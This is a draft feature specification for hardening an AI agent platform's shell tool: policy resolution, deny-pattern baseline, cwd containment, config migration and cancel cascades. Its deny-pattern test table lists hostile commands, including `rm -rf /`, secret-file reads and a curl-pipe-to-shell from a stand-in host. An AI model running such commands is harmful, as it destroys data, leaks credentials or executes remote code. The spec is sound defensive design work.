# Feature Specification: `bash` — Unified Shell Execution Tool

**Created**: 2026-07-04
**Status**: Draft
**Input**: Session design review (`tool-consolidation-design.html`, approved) + [ADR-036](../architecture/ADR-036-consolidate-shell-and-subagent-tools.md) §3.1, §3.5, §3.6
**Companion specs**: [`agent-delegation-spec.md`](./agent-delegation-spec.md), [`async-notifier-spec.md`](./async-notifier-spec.md) (this tool's background mode is a consumer of `AsyncNotifier`)

> **Implementation precondition (added 2026-07-04, 7-reviewer gate MAJ-002):** before starting, verify the working tree includes commit `d0f65482` (`git log --oneline | grep d0f65482`). At the time this spec was drafted, the local checkout was two commits behind `origin/hotfix/v0.1.1` and did not include it — if absent, fetch and check out `origin/hotfix/v0.1.1`'s actual tip rather than branching from local HEAD.
>
> **7-reviewer gate verdict (2026-07-04): BLOCK, now fixed below.** Two CRITICAL findings required real fixes before implementation, not just wording changes — see User Story 1 Acceptance Scenario 3/FR-B12 (new custom agents were NOT actually denied `bash` by default under the real compositor/seeding code, contradicting the original text) and FR-M4 (migration backup). See Clarifications for the full fix list.

---

## Existing Codebase Context

### Symbols Involved

| Symbol | Role | Context |
|--------|------|---------|
| `pkg/tools/shell.go`'s `ExecTool` | extends/replaces | Today's `exec` — universally registered, deny-patterns on by default (incl. `master.key`/`credentials.json`), `EvaluateExec` binary allowlist, dead `timeout` param, rich session actions (poll/read/kill/send-keys), PTY support |
| `pkg/tools/workspace_shell.go`'s `WorkspaceShellTool` | replaces (deleted) | `experimental.workspace_shell_enabled`-gated, deny-patterns off by default, real `timeout_sec` enforcement, `godMode bool` + `sandbox.ResolveLimits`, audit fail-closed |
| `pkg/tools/workspace_shell_bg.go`'s `WorkspaceShellBgTool` | replaces (deleted) | Linux-only, free-form background command + arbitrary port-expose via `sandbox.DevServerRegistry`, no shell wrapping, no status actions |
| `pkg/sandbox.ResolveLimits` (introduced in ADR-035 §7's fix wave) | calls | The god-mode-aware Limits resolution primitive this tool must use uniformly, replacing `exec`'s older parallel hardening path |
| `pkg/policy.Evaluator.EvaluateExec` | calls | The binary-allowlist mechanism, currently only consulted by `exec`'s foreground path — must extend to cover background mode too |
| `pkg/config`'s `AgentBuiltinToolsCfg.Policies` / `OmnipusSandboxConfig.ToolPolicies` | modifies (migration) | Persisted, exact-string-keyed tool-policy maps; renaming requires the migration in FR-M1 |
| `pkg/config.migration.go`'s `toolEnableToPolicy` table | modifies | Its `{"exec","exec"}` row must become `{"exec","bash"}` |
| `pkg/coreagent/core.go`'s `coreAgentSeed` | modifies | Jim's seed currently sets `"exec": allow, "workspace_shell": allow, "workspace_shell_bg": allow` — collapses to one `"bash": allow` entry |
| `pkg/agent/loop.go`'s `wireExecToolDeps`/`WireTier13Deps` | modifies | Two separate, uncoordinated registration paths today — collapse to one |
| `web_serve` tool | unrelated (kept as-is) | The redirect target for `workspace_shell_bg`'s dropped port-expose capability — not modified by this spec, just the reason that capability isn't ported |
| `pkg/tools/session.go`'s `ProcessSession`/`SessionManager` | extends | Today's background-session tracking has no owning-session/turn identity at all — a real gap this spec closes (FR-B10) so a session-level cancel can find which background `bash` sessions belong to it |
| `pkg/agent/cancel.go`'s `RequestCancel`/`CancelHooks` | extends | The single canonical cancel entry point for all four cancel surfaces (web SPA, Tier A `/cancel`, Tier B channels, CLI); already cascades to descendant **turns** via `collectDescendantTurnIDs` but has no equivalent cascade to detached background **processes** today — this spec adds that as a new optional hook, following the existing `CancelHooks.CancelPendingApprovals` pattern |
| `pkg/sysagent/tools/agent.go`'s new-custom-agent seeding | modifies (new, CRIT-001) | Currently seeds only `system.*: deny` (and sets `Tools.Builtin.DefaultPolicy = allow`) for a freshly created custom agent — no `exec`/`bash`-specific seed exists. FR-B12 adds a `bash: deny` seed here, mirroring the existing `system.*: deny` pattern exactly. |
| `pkg/tools/compositor.go`'s `passesScopeGate`/`effectiveToolPolicyWith` | unchanged, verified (CRIT-001) | Verified directly: `passesScopeGate` returns false for `ScopeCore` (which `bash` is, via `ExecTool.Scope()`) on a custom agent, but `effectiveToolPolicyWith`'s `scope != ScopeCore` exclusion means this does NOT deny the tool outright — it defers to the merged policy, which resolves an unlisted `ScopeCore` tool to the agent's `DefaultPolicy` (`allow` for new custom agents). This is why FR-B12's explicit seed is required — nothing else stops `bash` from resolving to `allow` by default. |

### Impact Assessment

| Symbol Modified | Risk Level | Direct Dependents | Indirect Dependents |
|----------------|------------|-------------------|---------------------|
| `pkg/tools/shell.go` (rewritten in place as `bash`) | HIGH | Every agent's tool registry, `pkg/gateway/rest_exec.go` (allowlist/proxy-status endpoints), frontend `ExecAllowlistSection.tsx`/`ExecProxyStatusCard.tsx` | ~40 partial-edit test files across `pkg/tools`, `pkg/agent`, `pkg/gateway`, `pkg/policy`, `pkg/config`, `pkg/coreagent` (per the earlier investigation's blast-radius map) |
| Persisted `Policies`/`ToolPolicies` maps (migration) | CRITICAL | Every operator's existing `config.json` with a policy entry for any of the three retired names | Compositor's default-`allow` fallback (the fail-open risk this migration exists to close) |
| `pkg/gateway/gateway.go`'s `emitGHSARemovalWarn` | LOW | Currently hardcodes `"exec"` — trivial rename, incidentally fixes a pre-existing gap (workspace_shell/_bg were never covered by this warning) |
| `pkg/agent/cancel.go`'s `RequestCancel` | MEDIUM | All four cancel surfaces (web SPA, Tier A `/cancel`, Tier B channels, CLI) — adding a new optional hook is additive, but every call site that constructs `CancelHooks{}` should be reviewed to confirm it wires the new hook where a background-bash-capable agent is in play | `pkg/tools/session.go`'s `SessionManager` (new `KillAllForSession` method) |

### Relevant Execution Flows

| Flow Name | Relevance |
|-----------|-----------|
| Agent turn → tool call → policy resolution → sandbox hardening → execution | The core flow this spec touches at every stage |
| Boot-time config load → migration pipeline | Where FR-M1's migration runs, once, before any agent can be affected by a stale policy key |
| WS interactive approval (`ws_approval.go`, per the `d0f65482` fix) | `bash`'s "ask" verdict flows through this unchanged — the approval-grant scoping/inheritance mechanism verified separately is a dependency, not something this spec modifies |

### Cluster Placement

This feature belongs to the **tool-registry / sandbox-execution** cluster, and is the direct continuation of the **ADR-035 sandbox-profile-removal** work in the same cluster.

---

## Available Reference Patterns

> No `docs/reference/` directory exists in this repository (Omnipus is a from-scratch Go backend, not built from a reference-pattern library). This section is not applicable — proven patterns are instead drawn directly from the sibling tools being consolidated (`exec`, `workspace_shell`) and the already-reviewed ADR-035 fix wave (`sandbox.ResolveLimits`).

---

## User Stories & Acceptance Criteria

### User Story 1 — An agent runs a shell command with one consistent, hardened default (Priority: P0)

Today, an agent denied shell access via `exec: deny` can still reach the same capability through `workspace_shell` (if enabled), which has weaker deny-pattern enforcement — a real, confirmed bypass. This story delivers the fix: one tool name, one policy surface, no alternate route.

**Why this priority**: This closes a live security bypass, not a style cleanup.

**Independent Test**: Configure an agent with `bash: deny`; attempt every known way to run a shell command (direct call, `run_in_background`, `persistent`, `action: poll/read/kill` against a session belonging to a different agent/conversation); confirm all are rejected identically (dataset enumerated under Test Datasets, not just the two headline examples — 7-reviewer gate MIN-001).

**Acceptance Scenarios**:

1. **Given** an agent's policy has `bash: deny`, **When** the agent calls `bash` with any arguments, **Then** the call is rejected before any subprocess is spawned.
2. **Given** an agent's policy has `bash: allow`, **When** the agent calls `bash` with a command matching the hardcoded deny-pattern baseline (e.g., referencing `master.key`), **Then** the call is still rejected — policy `allow` does not disable the deny-pattern layer.
3. **Given** a fresh custom agent with no explicit `bash` policy, **When** it attempts to call `bash`, **Then** it is denied by default — via a NEW explicit seeding requirement (FR-B12), not an existing convention. **Corrected 2026-07-04 (7-reviewer gate CRIT-001):** this is NOT already-true behavior. Verified against the real code: `pkg/sysagent/tools/agent.go` seeds only `system.*: deny` for new custom agents, and sets `Tools.Builtin.DefaultPolicy = allow`; `pkg/tools/compositor.go`'s `passesScopeGate` explicitly does NOT hard-deny `ScopeCore` tools (which `bash`/`exec` are) on custom agents — it defers to policy resolution, which then falls through to the seeded `allow` default. Implemented as originally worded, this ships `bash` reachable-by-default on every new custom agent — the exact fail-open bypass this whole consolidation exists to close. FR-B12 below adds the missing seed.

---

### User Story 2 — An agent runs a command in the background and checks on it later (Priority: P0)

Replaces `workspace_shell_bg`'s narrower, Linux-only, non-shell-wrapped background mode and reuses `exec`'s existing, richer session-management mechanics (poll/read/kill), now unified under one tool with `run_in_background` as a parameter.

**Why this priority**: A background-execution capability with no way to check on progress is not usable in practice; this is core to the tool's value, not an add-on.

**Independent Test**: Start a background command, poll its status before completion, read accumulated output mid-run, then read again after completion — verify each call returns only the incremental output since the last read.

**Acceptance Scenarios**:

1. **Given** an agent calls `bash` with `run_in_background: true`, **When** the call returns, **Then** it returns immediately with a `session_id`, without waiting for the command to finish.
2. **Given** a running background session, **When** the agent calls `bash` with `action: poll` and that `session_id`, **Then** the current status (`running`) is returned without blocking.
3. **Given** a background session that has produced output since the last `read`, **When** the agent calls `bash` with `action: read`, **Then** only the output produced since the last read is returned, not the full history again.
4. **Given** a running background session, **When** the agent calls `bash` with `action: kill`, **Then** the process group is terminated and subsequent `poll` calls report `killed`.

---

### User Story 3 — `cwd` cannot be used to escape the agent's workspace (Priority: P0)

Drops `exec`'s current absolute-path allowance in favor of `workspace_shell`'s strict relative-only enforcement.

**Why this priority**: A real, currently-exploitable escape hatch in `exec` today; closing it is a security fix, not a preference.

**Independent Test**: Call `bash` with `cwd` set to an absolute path and separately to a `../`-containing relative path; confirm both are rejected before any subprocess is spawned.

**Acceptance Scenarios**:

1. **Given** an agent calls `bash` with `cwd: "/etc"`, **When** the call is evaluated, **Then** it is rejected with a clear "path escapes workspace" error before any subprocess starts.
2. **Given** an agent calls `bash` with `cwd: "../../other-agent"`, **When** the call is evaluated, **Then** it is rejected the same way.
3. **Given** an agent calls `bash` with `cwd: "subdir/build"` (a real relative path inside its workspace), **When** the call is evaluated, **Then** the command runs with that directory as its working directory.

---

### User Story 4 — An operator's existing tool-policy configuration survives the rename (Priority: P0)

The single most important non-functional requirement in this spec: no operator's `deny` silently becomes `allow`.

**Why this priority**: This is the one place a functionally "just a rename" change carries a real security regression if done carelessly.

**Independent Test**: Load a `config.json` fixture with `tools_cfg: {"exec": "deny"}` on some agent through the full boot/migration pipeline; assert the agent's effective policy for `bash` is `deny`, not the compositor's default fallback.

**Acceptance Scenarios**:

1. **Given** a persisted config with a per-agent `"exec": "deny"` entry, **When** the config is loaded through the migration pipeline, **Then** the agent's effective `bash` policy is `deny`.
2. **Given** a persisted config with `"exec": "ask"` on one agent and `"workspace_shell": "deny"` on the same agent (a contradictory legacy state), **When** migrated, **Then** the stricter value (`deny`) wins.
3. **Given** a config already migrated once, **When** the migration runs again on the next boot, **Then** no further change occurs and no error is raised (idempotency).
4. **Given** a legacy `tools.exec.enabled: false` config (the older, pre-`ToolPolicyCfg` shape), **When** migrated, **Then** the resulting effective policy for `bash` is `deny`, not silently dropped.

---

### User Story 5 — Canceling a session also stops any background bash work it started (Priority: P0)

Today, background `bash` sessions outlive the chat they were started in by default (User Story 2/3's design) — but a real, existing cancel action (`RequestCancel`, the canonical entry point for the web SPA, Tier A `/cancel`, Tier B channels, and the CLI) already cascades to every descendant *turn* when a session is canceled. It does **not** reach detached background processes, which is a genuine gap: an operator who explicitly cancels a session has no way today to also stop a background build or long-running command it kicked off.

**Why this priority**: Leaving a background process orphaned after an explicit cancel is a real resource leak and a confusing operator experience ("I canceled it, why is it still running"), not a cosmetic gap.

**Independent Test**: Start a background `bash` session inside a chat session, then call `RequestCancel` for that same session; confirm the background process is killed and a subsequent `poll` reports `killed`, without needing any other feature in this spec to be exercised.

**Acceptance Scenarios**:

1. **Given** a chat session has one or more background `bash` sessions running, **When** `RequestCancel` fires for that session (via any of its four surfaces), **Then** every background `bash` session owned by that session is killed as part of the cascade, alongside the existing descendant-turn cancellation.
2. **Given** a chat session has no background `bash` sessions running, **When** `RequestCancel` fires, **Then** behavior is unchanged from today — the new cascade step is a no-op when there is nothing to kill.
3. **Given** a background `bash` session belongs to a *different* chat session than the one being canceled, **When** `RequestCancel` fires for the first session, **Then** the other session's background work is left untouched.

---

## Behavioral Contract

Primary flows:
- When an agent calls `bash` with only `command` set, the system runs it synchronously in the foreground and returns the result inline.
- When `run_in_background: true` is set, the system returns immediately with a session handle and continues the command detached.
- When policy resolves to `allow`, the system still enforces the deny-pattern baseline and binary allowlist — policy `allow` never bypasses these.

Error flows:
- When policy resolves to `deny`, the system rejects the call before any subprocess is spawned.
- When `cwd` escapes the workspace, the system rejects the call before any subprocess is spawned.
- When a command matches a deny pattern, the system rejects it with a clear, actionable error.

Boundary conditions:
- When `timeout_seconds` elapses, the system kills the process and reports a timeout, for both foreground and background modes identically.
- When `persistent: true` is set without `run_in_background: true`, the system rejects the call as invalid.
- When a session is explicitly canceled (`RequestCancel`, any of its four surfaces), the system kills every background `bash` session owned by that session, in addition to its existing descendant-turn cancellation.

---

## Edge Cases

- What happens when `action: poll`/`read`/`kill` references a `session_id` from a different agent or conversation? Expected: "not found" — never another conversation's session data (mirrors `check_spawn_status`'s existing scoping).
- What happens when a background session's process outlives the agent's own session, but the session is never explicitly canceled (e.g., the operator just stops chatting, or the WS connection drops)? Expected (resolved 2026-07-04): the process is left running, matching `DevServerRegistry`'s existing independent lifecycle — passive inactivity does not cascade-kill it. The notification attempt is logged if it fails, not silently dropped; see `async-notifier-spec.md`'s edge cases.
- What happens when the session IS explicitly canceled (User Story 5)? Expected (resolved 2026-07-04): unlike passive inactivity above, an explicit cancel DOES cascade-kill every background `bash` session owned by that session — this is the one case where background work is force-stopped rather than left to finish naturally.
- What happens when the deny-pattern baseline and an operator's custom `allow`-style override conflict (operator tries to explicitly permit `rm -rf /`)? Expected: the hardcoded baseline cannot be disabled by any operator configuration — only the *extension* patterns are operator-controlled, not the floor.
- What happens when `bash` is called with an empty `command` string? Expected: rejected as invalid input, no subprocess spawned.
- What happens when the audit log write itself fails? Expected: fail-closed — the call is refused (matching `workspace_shell`'s existing stricter behavior, not `exec`'s current unguarded one).

---

## Explicit Non-Behaviors

- The system must not support PTY/interactive terminal sessions because this is real additional attack surface (arbitrary interactive command entry) for a capability nothing currently observed in this codebase depends on, and Claude Code's own Bash tool has no equivalent.
- The system must not support free-form background command execution with arbitrary port exposure because this is genuinely redundant with the existing `web_serve` tool's dev-server mode, which does the same job with a safer command allow-list rather than a free-form command.
- The system must not allow any operator configuration to disable the hardcoded deny-pattern baseline (including the `master.key`/`credentials.json` literal guards) because that floor is the one thing preventing the exact bypass this whole spec exists to close.
- The system must not silently drop or default-loosen a persisted tool-policy `deny` during migration because that is a live security regression, not an acceptable cleanup side effect.
- The system must not leave a stale `exec`/`workspace_shell`/`workspace_shell_bg` policy key behind in the persisted config after migration because the operator has explicitly rejected permanent dual-key backward compatibility — migration is a one-shot conversion, not an ongoing legacy-key-resolution feature.
- The system must not kill a background `bash` session merely because its owning chat session goes idle or its WebSocket disconnects because that is passive inactivity, not an explicit cancel — only `RequestCancel` firing for that session triggers the kill cascade (User Story 5).
- The system must not attempt to preserve or migrate an in-flight `send-keys`/PTY-adjacent session created by the old `exec` tool across a binary upgrade (added 2026-07-04, MIN-004) because PTY support itself is dropped (see above) — no in-flight PTY session is expected to survive a restart onto the new binary, consistent with the already-accepted "gateway restart drops in-flight background state" edge case in the companion `async-notifier-spec.md`.

---

## Integration Boundaries

### `pkg/sandbox` (Limits/hardening)

- **Data in**: `godMode bool`, `workspaceDir string`, `*sandbox.EgressProxy`, `timeoutSeconds int32`.
- **Data out**: `sandbox.Limits{TimeoutSeconds, MemoryLimitBytes, WorkspaceDir, EgressProxyAddr}`, or an error.
- **Contract**: `sandbox.ResolveLimits(godMode, workspaceDir, proxy, timeoutSeconds)` (ADR-035 §7) — no new contract, reused as-is.
- **On failure**: an unresolvable `workspaceDir` returns an explicit error (fails closed) unless `godMode` is true, in which case the zero-value `Limits` is returned without touching the filesystem.
- **Development**: real service — this is in-process, not an external dependency.

### `pkg/policy.Evaluator` (binary allowlist)

- **Data in**: the resolved command string, the agent's `allowed_binaries` glob patterns.
- **Data out**: allow/deny verdict.
- **Contract**: `EvaluateExec` — unchanged signature, now called from both foreground and background paths.
- **On failure**: an empty `allowed_binaries` list is a no-op (matches today's default-permissive behavior for operators who never configured it).
- **Development**: real service, in-process.

### `pkg/agent/cancel.go` (`RequestCancel`/`CancelHooks`)

- **Data in**: the session ID being canceled (resolved internally by `RequestCancel` from either `CancelScope.SessionID` or `(Channel, ChatID)`).
- **Data out**: none directly — the new hook is fire-and-forget, matching the existing `CancelPendingApprovals`/`SetSessionInterrupted` hooks' shape.
- **Contract**: a new optional `CancelHooks.KillBackgroundSessions func(sessionID string)` field (nil-skipped, matching every other `CancelHooks` field's convention), called during `RequestCancel`'s existing "PHASE A: graceful cascade" step, backed by a new `SessionManager.KillAllForSession(sessionID string) int` method that kills every `ProcessSession` whose `OwnerSessionID` matches.
- **On failure**: killing an individual background session that fails (e.g., process already exited) is logged and does not abort the rest of the cascade or `RequestCancel`'s own turn-cancellation flow.
- **Development**: real service — in-process, not mockable in any meaningful sense for this purpose.

### `pkg/config` migration pipeline

- **Data in**: the raw, on-disk `config.json` at boot.
- **Data out**: a migrated in-memory (and, per the existing `SelfHealWriteHook` pattern, on-disk) config with old tool-policy keys rewritten **and the migrated-from legacy keys deleted** — no permanent dual-key backward compatibility.
- **Contract**: additive-then-cleanup, idempotent, logged — matching the existing `migrate*` function family's established contract, extended with an explicit deletion step.
- **On failure**: a migration failure must not silently proceed with an unmigrated, fail-open state — it must be loud (boot-time WARN/ERROR), matching this repo's existing migration-failure conventions.
- **Development**: real service — config loading is in-process, not mockable in any meaningful sense for this purpose.

---

## BDD Scenarios

### Feature: `bash` — one shell tool, one policy surface

#### Scenario: Agent denied bash cannot run a command

**Traces to**: User Story 1, Acceptance Scenario 1
**Category**: Error Path

- **Given** an agent whose policy has `bash: deny`
- **When** the agent calls `bash` with `command: "ls"`
- **Then** the call is rejected
- **And** no subprocess is ever spawned

---

#### Scenario: Policy allow does not bypass the deny-pattern baseline

**Traces to**: User Story 1, Acceptance Scenario 2
**Category**: Error Path

- **Given** an agent whose policy has `bash: allow`
- **When** the agent calls `bash` with `command: "cat master.key"`
- **Then** the call is rejected by the deny-pattern baseline
- **But** the rejection is NOT because of policy — policy already said allow

---

#### Scenario: New custom agent is denied bash by default

**Traces to**: User Story 1, Acceptance Scenario 3
**Category**: Happy Path

- **Given** a freshly created custom agent, whose `AgentBuiltinToolsCfg.Policies` was seeded with `bash: deny` at creation time (FR-B12), alongside the existing `system.*: deny` seed
- **When** it attempts to call `bash`
- **Then** it is denied — because of the new explicit seed, not an assumed pre-existing convention

---

#### Scenario: A custom agent's `DefaultPolicy: allow` does not leave bash reachable if the seed is missing

**Traces to**: User Story 1, Acceptance Scenario 3 (regression guard for CRIT-001)
**Category**: Error Path

- **Given** a hypothetical implementation that omits FR-B12's seeding step
- **When** a freshly created custom agent (which gets `Tools.Builtin.DefaultPolicy = allow` per `pkg/sysagent/tools/agent.go`'s existing seeding) attempts to call `bash`
- **Then** this test MUST fail, proving the seed in FR-B12 is load-bearing and not redundant with any existing deny-by-default mechanism — there is no other floor stopping `bash` (a `ScopeCore` tool) from resolving to `allow` via `passesScopeGate`'s explicit `ScopeCore` exclusion in `pkg/tools/compositor.go`

---

#### Scenario: Background command returns immediately with a session handle

**Traces to**: User Story 2, Acceptance Scenario 1
**Category**: Happy Path

- **Given** an agent with `bash: allow`
- **When** it calls `bash` with `command: "sleep 30"`, `run_in_background: true`
- **Then** the call returns within a fraction of a second
- **And** the response includes a `session_id`

---

#### Scenario: Polling a running background session reports its status without blocking

**Traces to**: User Story 2, Acceptance Scenario 2
**Category**: Happy Path

- **Given** a background session started via the previous scenario, still running
- **When** the agent calls `bash` with `action: poll`, `session_id: <the handle>`
- **Then** the response reports status `running`
- **And** the call returns without waiting for the command to finish

---

#### Scenario: Reading a background session returns only new output since the last read

**Traces to**: User Story 2, Acceptance Scenario 3
**Category**: Happy Path

- **Given** a background session that has already been `read` once, and has since produced more output
- **When** the agent calls `bash` with `action: read`, `session_id: <the handle>`
- **Then** only output produced since the previous `read` call is returned

---

#### Scenario: Killing a background session terminates it and updates its status

**Traces to**: User Story 2, Acceptance Scenario 4
**Category**: Happy Path

- **Given** a running background session
- **When** the agent calls `bash` with `action: kill`, `session_id: <the handle>`
- **Then** the process group is terminated
- **And** a subsequent `poll` call reports status `killed`

---

#### Scenario: Absolute cwd is rejected before any subprocess spawns

**Traces to**: User Story 3, Acceptance Scenario 1
**Category**: Error Path

- **Given** an agent with `bash: allow`
- **When** it calls `bash` with `command: "ls"`, `cwd: "/etc"`
- **Then** the call is rejected with a "path escapes workspace" error
- **And** no subprocess is spawned

---

#### Scenario: Relative-path traversal cwd is rejected

**Traces to**: User Story 3, Acceptance Scenario 2
**Category**: Error Path

- **Given** an agent with `bash: allow`
- **When** it calls `bash` with `command: "ls"`, `cwd: "../../other-agent"`
- **Then** the call is rejected the same way as an absolute path

---

#### Scenario: A real relative cwd inside the workspace is honored

**Traces to**: User Story 3, Acceptance Scenario 3
**Category**: Happy Path

- **Given** an agent with `bash: allow` whose workspace has a `subdir/build` directory
- **When** it calls `bash` with `command: "pwd"`, `cwd: "subdir/build"`
- **Then** the command runs with that directory as its working directory

---

#### Scenario: A symlink pointing outside the workspace is rejected as a cwd escape

**Traces to**: User Story 3 (added 2026-07-04, 7-reviewer gate MAJ-001)
**Category**: Error Path

- **Given** an agent with `bash: allow` whose workspace contains a symlink `evil_link` pointing to `/etc` (created by an earlier `bash` call)
- **When** it calls `bash` with `command: "ls"`, `cwd: "evil_link"`
- **Then** the call is rejected with a "path escapes workspace" error, the same as an absolute path
- **And** this holds even though `"evil_link"` is a syntactically valid relative path with no `..` and no leading `/` — the guard resolves symlinks (`filepath.EvalSymlinks`) before the containment check, not just `filepath.Clean` (FR-B13)

---

#### Scenario: A deep-nested traversal that nets one level above the workspace root is still rejected

**Traces to**: User Story 3 (added 2026-07-04, MIN-004 — complements dataset row 6's positive control)
**Category**: Edge Case

- **Given** an agent with `bash: allow` whose workspace root contains a subdirectory `a`
- **When** it calls `bash` with `command: "ls"`, `cwd: "a/../../b"` (net effect: one level above workspace root)
- **Then** the call is rejected — the final-resolved-path check (not a `..`-presence check) still correctly rejects this net-outside case, distinguishing it from the accepted `"subdir/../subdir"` case which nets back inside

---

#### Scenario: Persisted per-agent exec:deny survives migration as bash:deny

**Traces to**: User Story 4, Acceptance Scenario 1
**Category**: Happy Path

- **Given** a persisted `config.json` with `tools_cfg: {"exec": "deny"}` on agent `research-bot`
- **When** the config is loaded through the boot migration pipeline
- **Then** `research-bot`'s effective policy for `bash` is `deny`

---

#### Scenario: Contradictory legacy keys resolve to the stricter value

**Traces to**: User Story 4, Acceptance Scenario 2
**Category**: Edge Case

- **Given** a persisted config with `"exec": "ask"` and `"workspace_shell": "deny"` on the same agent
- **When** migrated
- **Then** the agent's effective `bash` policy is `deny`

---

#### Scenario: Migration is idempotent across repeated boots

**Traces to**: User Story 4, Acceptance Scenario 3
**Category**: Edge Case

- **Given** a config that has already been migrated once
- **When** the gateway boots again and the migration runs a second time
- **Then** no further change is made to the config
- **And** no error is raised

---

#### Scenario: Legacy tools.exec.enabled=false still results in bash being denied

**Traces to**: User Story 4, Acceptance Scenario 4
**Category**: Alternate Path

- **Given** a persisted config using the older `tools.exec.enabled: false` shape (pre-`ToolPolicyCfg`)
- **When** migrated
- **Then** the resulting effective policy for `bash` is `deny`

---

#### Scenario: Migration deletes the legacy key it converted — no backward-compat dual-key state

**Traces to**: User Story 4 (migration cleanup, resolved 2026-07-04)
**Category**: Happy Path

- **Given** a persisted config with `tools_cfg: {"exec": "deny"}` on some agent
- **When** the config is loaded through the boot migration pipeline
- **Then** the agent's effective `bash` policy is `deny`
- **And** the persisted config no longer contains an `"exec"` key for that agent — it was converted, not merely superseded

---

#### Scenario: Migration writes a recoverable backup before deleting legacy keys

**Traces to**: User Story 4 (added 2026-07-04, 7-reviewer gate CRIT-002)
**Category**: Happy Path

- **Given** a persisted config with `tools_cfg: {"exec": "deny"}` on some agent
- **When** the config is loaded through the boot migration pipeline
- **Then** a timestamped backup file (e.g., `config.json.pre-bash-migration.<unix-ts>.bak`) containing the pre-migration policy maps is written before the legacy `"exec"` key is deleted
- **And** the boot log line naming the migration also names the backup file's path

---

#### Scenario: A malformed legacy policy value is treated as deny, not silently coerced to allow

**Traces to**: User Story 4 (added 2026-07-04, MAJ-005)
**Category**: Error Path

- **Given** a hand-edited config with `tools_cfg: {"exec": "Disabled"}` (not one of `deny`/`ask`/`allow`)
- **When** the config is loaded through the boot migration pipeline
- **Then** the agent's effective `bash` policy is `deny` (fail-safe), not `allow` and not a panic
- **And** a WARN log line names the offending agent, key, and value

---

### Feature: Session cancel cascades to background bash sessions

#### Scenario: Canceling a session kills its background bash sessions

**Traces to**: User Story 5, Acceptance Scenario 1
**Category**: Happy Path

- **Given** a chat session has a running background `bash` session (`command: "sleep 300"`, `run_in_background: true`)
- **When** `RequestCancel` fires for that session
- **Then** the background session's process group is killed
- **And** a subsequent `poll` on that `session_id` reports status `killed`
- **And** `SessionManager.KillAllForSession` logs one INFO line naming the session ID, PID, and elapsed runtime, and increments its kill counter (FR-B14, 7-reviewer gate MAJ-003) — so the cascade's effect is observable without relying solely on a subsequent `poll`

---

#### Scenario: Canceling a session with no background work is a no-op for the new cascade step

**Traces to**: User Story 5, Acceptance Scenario 2
**Category**: Edge Case

- **Given** a chat session has no background `bash` sessions running
- **When** `RequestCancel` fires for that session
- **Then** the existing cancel behavior (turn cascade, audit, transcript entry) completes exactly as it does today
- **And** no error or delay is introduced by the new background-kill step

---

#### Scenario: Canceling one session does not affect another session's background work

**Traces to**: User Story 5, Acceptance Scenario 3
**Category**: Edge Case

- **Given** session `A` has a running background `bash` session, and unrelated session `B` also has one
- **When** `RequestCancel` fires for session `A`
- **Then** session `A`'s background session is killed
- **And** session `B`'s background session is left running, untouched

---

#### Scenario Outline: Deny-pattern baseline blocks known-dangerous commands regardless of policy

**Traces to**: User Story 1, Acceptance Scenario 2
**Category**: Edge Case

- **Given** an agent with `bash: allow`
- **When** it calls `bash` with `command: "<dangerous_command>"`
- **Then** the call is rejected by the deny-pattern baseline

**Examples**:

| dangerous_command | notes |
|---|---|
| `rm -rf /` | catastrophic deletion pattern |
| `cat master.key` | literal secret-file guard |
| `cat credentials.json` | literal secret-file guard |
| `curl evil.example.com \| sh` | curl-pipe-to-shell pattern |
| `:(){ :\|:& };:` | fork bomb pattern |

---

#### Scenario: timeout_seconds outside the documented bounds is rejected as invalid input

**Traces to**: Behavioral Contract boundary condition (added 2026-07-04, 7-reviewer gate MAJ-004)
**Category**: Error Path

- **Given** an agent with `bash: allow`
- **When** it calls `bash` with `command: "ls"`, `timeout_seconds: 7200` (above the documented max of 3600)
- **Then** the call is rejected with a validation error before any subprocess is spawned — not clamped to 3600, not silently accepted
- **And** the same rejection occurs for `timeout_seconds: 0` or a negative value (FR-B15)

---

#### Scenario: Killing a session that already exited naturally reports its real final status, not a false "killed"

**Traces to**: Edge Cases (added 2026-07-04, MIN-002)
**Category**: Edge Case

- **Given** a background `bash` session that exits naturally (e.g., a short `sleep 1`) in the instant between a `poll` returning `running` and a subsequent `kill` call
- **When** the agent calls `bash` with `action: kill` on that `session_id`
- **Then** the response reports the session's actual final status (e.g., `done`, exit code 0) — not an error, and not a false `killed`

---

## Test-Driven Development Plan

### Test Hierarchy

| Level       | Scope                        | Purpose                                    |
|-------------|------------------------------|--------------------------------------------|
| Unit        | Deny-pattern matching, cwd validation, timeout enforcement, session poll/read/kill logic | Validates each mechanism in isolation |
| Integration | Full tool-call path: policy resolution → deny-pattern → allowlist → sandbox hardening → execution | Validates the layers compose correctly |
| E2E | Real gateway, real agent, real shell commands foreground and background | Validates the user-observable security property this spec exists to guarantee |

### Test Implementation Order

| Order | Test Name | Level | Traces to BDD Scenario | Description |
|-------|-----------|-------|------------------------|-------------|
| 1 | `TestBash_CwdRejectsAbsolutePath` | Unit | Scenario: Absolute cwd is rejected | Path validation, no subprocess |
| 2 | `TestBash_CwdRejectsTraversal` | Unit | Scenario: Relative-path traversal cwd is rejected | Path validation |
| 3 | `TestBash_CwdAcceptsValidRelativePath` | Unit | Scenario: A real relative cwd inside the workspace is honored | Positive control |
| 4 | `TestBash_DenyPatternBaseline` (table-driven) | Unit | Scenario Outline: Deny-pattern baseline blocks known-dangerous commands | Every row in the dangerous-command dataset |
| 5 | `TestBash_PolicyAllowDoesNotBypassDenyPatterns` | Unit | Scenario: Policy allow does not bypass the deny-pattern baseline | Ordering proof |
| 6 | `TestBash_PolicyDenyRejectsBeforeSpawn` | Unit | Scenario: Agent denied bash cannot run a command | Ordering proof |
| 7 | `TestBash_NewCustomAgentDeniedByDefault` | Unit | Scenario: New custom agent is denied bash by default | Proves the NEW FR-B12 seed exists in `pkg/sysagent/tools/agent.go` — not an assumed pre-existing convention (7-reviewer gate CRIT-001) |
| 7b | `TestBash_NewCustomAgentReachableIfSeedMissing_RegressionGuard` **(NEW)** | Unit | Scenario: A custom agent's DefaultPolicy: allow does not leave bash reachable if the seed is missing | Negative control: fails if FR-B12's seed is ever removed/regressed — proves the seed is load-bearing, not redundant |
| 8 | `TestBash_TimeoutEnforced_Foreground` | Unit | Behavioral Contract boundary condition | Foreground timeout |
| 9 | `TestBash_TimeoutEnforced_Background` | Unit | Behavioral Contract boundary condition | Background timeout, same enforcement |
| 9b | `TestBash_TimeoutOutOfBoundsRejected` **(NEW)** | Unit | Scenario: timeout_seconds outside the documented bounds is rejected as invalid input | FR-B15 — 0, negative, and >3600 all rejected, not clamped |
